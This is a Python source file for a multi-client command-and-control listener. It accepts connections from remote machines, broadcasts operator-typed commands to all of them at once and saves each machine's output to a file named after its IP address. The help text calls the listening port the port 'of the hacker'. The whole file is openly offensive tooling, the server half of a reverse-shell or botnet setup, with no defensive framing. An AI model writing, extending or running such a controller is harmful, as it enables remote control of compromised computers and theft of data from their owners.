import socket
import argparse
from termcolor import cprint
import threading

class Listener:
    CLIENTS = {}

    def __init__(self, port):
        self.sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sd.bind(('', port))
        self.sd.listen(10)
        self.mutex = threading.Lock()

    def command(self):
        while True:
            command = input(">> ")
                
            t_list = []

            for client_sd in list(self.CLIENTS.keys()):
                t = threading.Thread(target=self.execute_client, args=(client_sd, command))
                t_list.append(t)
                t.start()

            for t in t_list:
                t.join()

    def execute_client(self, client_sd, command):
        client_sd.send(command.encode())
        x = client_sd.recv(1024).decode('utf-8','ignore')

        with open(f'{self.CLIENTS[client_sd][0]}.txt','w') as f:
            f.write(x)


    def run(self):
        cmd = threading.Thread(target=self.command)
        cmd.start()

        while True:
            #Waiting for requests
            client_sd, client_address = self.sd.accept()

            self.mutex.acquire()
            try:
                self.CLIENTS[client_sd]=client_address
            finally:
                self.mutex.release()

        cmd.join()

'''
Error raised if the user doesn't specify a valid gateway IP address
'''
class NoPortSpecified(Exception):
    pass

'''
Parser of command line arguments
'''
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-port", "-p", dest="port", help="Port number of the hacker")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.port:
            raise NoPortSpecified
        
        cprint('Port:  ', 'green', attrs=['bold',], end='')
        print(f'{args.port}', end='\n\n')

    except NoPortSpecified as e :
        parser.print_help()
        exit(0)

    return int(args.port)


if __name__=='__main__':
    port = args_parser()
    server = Listener(port)
    server.run()
